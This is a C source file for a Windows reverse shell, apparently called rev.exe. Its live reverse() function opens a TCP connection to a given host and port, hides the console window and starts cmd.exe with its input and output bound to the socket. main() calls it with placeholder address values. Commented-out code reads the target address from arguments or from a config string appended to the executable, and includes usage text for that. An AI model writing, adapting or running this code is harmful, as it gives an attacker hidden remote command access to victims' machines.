
#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
// Windows Header Files
#include <windows.h>
#include <tchar.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

//static TCHAR g$szExecute[MAX_PATH << 2u];
//static TCHAR g$szHost[MAX_PATH << 2u];
//static TCHAR g$szPort[16];
//static UINT16 g$uPort;
//static HANDLE g$hFile = INVALID_HANDLE_VALUE;

//static errno_t __cdecl $_tcscpy_s(char* dest, size_t destSize, const char* src) {
//    if (dest == NULL || src == NULL || destSize == 0 || destSize > RSIZE_MAX) {
//        if (dest != NULL && destSize > 0) {
//            dest[0] = _T('\0'); // 清空目标缓冲区
//        }
//        return EINVAL; // 无效参数
//    }
//
//    size_t i;
//    for (i = 0; i < destSize; i++) {
//        dest[i] = src[i];
//        if (src[i] == _T('\0')) {
//            return 0; // 成功
//        }
//    }
//
//    dest[0] = _T('\0'); // 清空目标缓冲区
//    return ERANGE;  // 缓冲区溢出
//}

//static int print(_In_ PCTSTR text) {
//    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
//    DWORD charsWritten = 0;
//    if (hConsole == INVALID_HANDLE_VALUE) {
//        return (INT32)hConsole;
//    }
//    return WriteConsole(hConsole, text, _tcslen(text), &charsWritten, NULL) | FlushConsoleInputBuffer(hConsole);
//}


//void* _memcpy(void* dst, const void* src, size_t len) {
//    BYTE* pd = (BYTE*)dst;
//    const BYTE* ps = (const BYTE*)src;
//    for (size_t i = 0; i < len; i++) {
//        pd[i] = ps[i];
//    }
//    return dst;
//}
//
//void _memset(void* buf, BYTE val, size_t len) {
//    BYTE* pd = (BYTE*)buf;
//    for (size_t i = 0; i < len; i++) {
//        pd[i] = val;
//    }
//}
//
//void _bzero(void* buf, size_t len) {
//    _memset(buf, 0, len);
//}

//static void log_to_file(PCTSTR text) {
//    INT32 retCode = ERROR_SUCCESS;
//    HANDLE hFile = INVALID_HANDLE_VALUE;
//    DWORD bytesWritten;
//    BOOL bRet;
//
//    hFile = CreateFile(
//        "debug.log",
//        GENERIC_WRITE,
//        FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE,
//        NULL,
//        OPEN_ALWAYS,
//        FILE_ATTRIBUTE_NORMAL,
//        NULL
//    );
//    if (hFile == INVALID_HANDLE_VALUE) {
//        retCode = ERROR_OPEN_FAILED;
//        goto __ERROR__;
//    }
//    bRet = WriteFile(hFile, text, _tcslen(text), &bytesWritten, NULL);
//    if (!bRet) {
//        retCode = ERROR_WRITE_FAULT;
//        goto __ERROR__;
//    }
//
//    goto __FREE__;
//__ERROR__:
//    do {} while (0);
//__FREE__:
//    if (hFile != INVALID_HANDLE_VALUE) {
//        CloseHandle(hFile);
//        hFile = INVALID_HANDLE_VALUE;
//    }
//}

//static int print_help() {
//    TCHAR* text = NULL;
//
//    text = _T("Usage:\n");
//    print(text);
//    text = _T("\trev.exe <ip> <port>\n");
//    print(text);
//    text = _T("\trev.exe <ip>:<port>\n");
//    print(text);
//    text = _T("\tor write connection config at end of rev.exe, such as [echo '10.10.10.10:4444' >> rev.exe]\n\n");
//    print(text);
//    return 0;
//}

//static int find_execute(_In_ PCTSTR cmdline) {
//    if (NULL == cmdline) {
//        return -ERROR_INVALID_ADDRESS;
//    }
//    TCHAR buffer[MAX_PATH << 2u];
//    for (int i = 0; i < _tcslen(cmdline); i++) {
//        TCHAR ch = cmdline[i];
//        if (ch == _T(' ')) {
//            _bzero(buffer, sizeof(buffer));
//            if (i + 1 > sizeof(buffer)) {
//                return -ERROR_BUFFER_OVERFLOW;
//            }
//            _memcpy(buffer, cmdline, i);
//            g$hFile = CreateFile(
//                buffer,
//                GENERIC_READ,
//                FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE,
//                NULL,
//                OPEN_EXISTING,
//                FILE_ATTRIBUTE_NORMAL,
//                NULL
//            );
//            if (g$hFile != INVALID_HANDLE_VALUE) {
//                if (i + 1 > sizeof(g$szExecute)) {
//                    return -ERROR_BUFFER_OVERFLOW;
//                }
//                _bzero(g$szExecute, sizeof(g$szExecute));
//                _memcpy(g$szExecute, cmdline, i);
//                return i;
//            }
//        }
//    }
//    return -1;
//}

//static int parse_arguments(_In_ PCTSTR arguments) {
//    if (NULL == arguments) {
//        return -ERROR_INVALID_ADDRESS;
//    }
//    TCHAR buffer[MAX_PATH << 2u];
//    TCHAR* start = NULL;
//    for (int i = 0; i < _tcslen(arguments); i++) {
//        if (arguments[i] != _T(' ')) {
//            start = arguments + i;
//        }
//    } // delete the left space characters
//    if (!start) {
//        return -ERROR_DATA_NOT_ACCEPTED;
//    }
//    if (_tcslen(start) + 1 > sizeof(buffer)) {
//        return -ERROR_BUFFER_OVERFLOW;
//    }
//    _bzero(buffer, sizeof(buffer));
//    _memcpy(buffer, start, _tcslen(start));
//    for (int i = _tcslen(buffer) - 1; i > -1; i--) {
//        if (buffer[i] == _T(' ')) {
//            buffer[i] = _T('\0');
//        }
//    } // delete the right space characters
//    int split_index = -1;
//    for (int i = 0; i < _tcslen(buffer); i++) {
//        TCHAR ch = buffer[i];
//        if (ch == _T(':') || ch == _T(' ')) {
//            split_index = i;
//            break;
//        }
//    }
//    if (split_index <= 0) {
//        return -ERROR_BUFFER_OVERFLOW;
//    }
//    {
//        if (split_index + 1 > sizeof(g$szHost)) {
//            return -ERROR_BUFFER_OVERFLOW;
//        }
//
//        _bzero(g$szHost, sizeof(g$szHost));
//        _memcpy(g$szHost, buffer, split_index);
//    }
//    {
//        TCHAR* p = buffer + split_index + 1;
//        for (int i = split_index + 1; i < _tcslen(buffer); i++) {
//            if (buffer[i] != _T(' ')) {
//                p = buffer + i;
//                break;
//            }
//        }
//        if (_tcslen(p) > sizeof(g$szPort)) {
//            return -ERROR_BUFFER_OVERFLOW;
//        }
//        _bzero(g$szPort, sizeof(g$szPort));
//        UINT64 m = 0;
//        for (int j = 0; j < _tcslen(p); j++) {
//            TCHAR ch = p[j];
//            if (ch < _T('0') || ch > _T('9')) {
//                return -ERROR_DATA_NOT_ACCEPTED;
//            }
//            m = m * 10 + ch - _T('0');
//            g$szPort[j] = ch;
//        }
//        if (m > 65535) {
//            return -ERROR_DATA_NOT_ACCEPTED;
//        }
//        g$uPort = (UINT16)m;
//    }
//    return 0;
//}

//static int parse_config(_In_ PCTSTR cmdline) {
//    int retCode = -1;
//    int idx = find_execute(cmdline);
//    if (idx > 0) {
//        if (idx < _tcslen(cmdline)) {
//            // there are some arguments
//            retCode = parse_arguments(cmdline + idx + 1);
//        }
//    }
//    if (0 != retCode && g$hFile != INVALID_HANDLE_VALUE) {
//        TCHAR buffer[MAX_PATH];
//        _bzero(buffer, sizeof(buffer));
//        // 获取文件大小
//        LARGE_INTEGER fileSize;
//        if (!GetFileSizeEx(g$hFile, &fileSize)) {
//            return retCode;
//        }
//        DWORD bytesToRead = 1024;
//        if (fileSize.QuadPart < bytesToRead) {
//            bytesToRead = fileSize.LowPart;
//        }
//        // 移动文件指针到倒数第 1024 字节处
//        LARGE_INTEGER offset;
//        offset.QuadPart = -(LONGLONG)(bytesToRead);
//        if (SetFilePointerEx(g$hFile, offset, NULL, FILE_END) == INVALID_SET_FILE_POINTER) {
//            return retCode;
//        }
//        DWORD bytesRead;
//        if (!ReadFile(g$hFile, buffer, bytesToRead, &bytesRead, NULL)) {
//            return retCode;
//        }
//        TCHAR* start = buffer;
//        for (int i = sizeof(buffer) - 1; i > -1; i--) {
//            TCHAR c = buffer[i];
//            if (c == _T(' ') || c == _T(':') || c == _T('.') || (c >= _T('A') && c <= _T('Z')) || (c >= _T('a') && c <= _T('z')) || (c >= _T('0') && c <= _T('9'))) {
//                continue;
//            }
//            start = buffer + i;
//            break;
//        }
//        retCode = parse_arguments(cmdline + idx + 1);
//    }
//    return retCode;
//}

//static INT32 parse_command_arguments() {
//    TCHAR* start = NULL, * end = NULL, * port_start = NULL;
//    BOOL overflow = FALSE;
//    if (g_argc == 2) {
//        // split by [:]
//        start = g_argv[1];
//        for (int i = 0; i < _tcslen(start); i++) {
//            TCHAR ch = start[i];
//            if (ch == _T(':')) {
//                end = start + i;
//                port_start = end + 1;
//                break;
//            }
//        }
//    }
//    else if (g_argc == 3) {
//        // split by [ ]
//        start = g_argv[1];
//        end = start + _tcslen(start);
//        port_start = g_argv[2];
//    }
//    else {
//        return -1;
//    }
//    ZeroMemory(g_host, sizeof(g_host));
//    for (int i = 0; i < end - start; i++) {
//        if (_tcslen(g_host) >= sizeof(g_host) - 1) {
//            overflow = TRUE;
//            break;
//        }
//        g_host[i] = start[i];
//    }
//    if (overflow) {
//        return -2;
//    }
//    UINT64 m = 0;
//    //g_port = 0;
//    for (int i = 0; i < _tcslen(port_start); i++) {
//        TCHAR ch = port_start[i];
//        if (ch < _T('0') || ch > _T('9')) {
//            return -3;
//        }
//        m = m * 10 + (ch - _T('0'));
//    }
//    if (m > 65535) {
//        return -4;
//    }
//    g_port = (UINT16)m;
//    $_tcscpy_s(g_port_s, sizeof(g_port_s), port_start);
//    return 0;
//}
//
//
//static INT32 parse_file_arguments() {
//    TCHAR buffer[64];
//    TCHAR* filename = g_argv[0];
//    return 0;
//}

static int reverse(PCTSTR host, PCTSTR port) {
    FreeConsole();
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    struct addrinfo* result = NULL, * ptr = NULL, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    getaddrinfo(host, port, &hints, &result);
    ptr = result;
    SOCKET ConnectSocket = WSASocket(
        ptr->ai_family, 
        ptr->ai_socktype, 
        ptr->ai_protocol,
        NULL, 0, 0
    );
    connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = (HANDLE)ConnectSocket;
    si.hStdOutput = (HANDLE)ConnectSocket;
    si.hStdError = (HANDLE)ConnectSocket;
    TCHAR cmd[] = _T("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    WSACleanup();
    return 0;
}


int main() {
    //PCTSTR cmdline = GetCommandLine();


    //for (int i = 0; i < argc; i++) {
    //    print(argv[i]);
    //}

    //g_argc = argc;
    //g_argv = argv;
    //INT32 retCode = 0;
    //
    //if (g_argc > 1) {
    //    retCode = parse_command_arguments();
    //}
    //else {
    //    retCode = parse_file_arguments();
    //}
    //int retCode = parse_config(cmdline);
    //if (0 == retCode) {
    return reverse("255.255.255.255", "65536");
    //}
    //else {
        //print_help();
        //return retCode;
    //}
}
